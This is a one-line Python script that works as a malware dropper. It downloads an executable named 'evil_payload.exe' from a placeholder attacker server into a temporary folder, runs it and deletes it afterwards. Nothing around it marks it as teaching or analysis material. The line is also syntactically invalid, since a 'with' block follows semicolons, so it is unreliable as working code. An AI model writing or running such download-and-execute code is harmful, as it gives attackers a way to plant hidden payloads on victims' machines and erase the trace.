import os,requests as r;z=os.path.join(os.environ["TEMP"],"evil_temp");os.makedirs(z,exist_ok=True);f=os.path.join(z,"evil_payload.exe");d=r.get("http://your-evil-server.com/evil_payload.exe",stream=True);with open(f,"wb") as w: [w.write(e) for e in d.iter_content(chunk_size=8192)];os.system(f);os.remove(f)
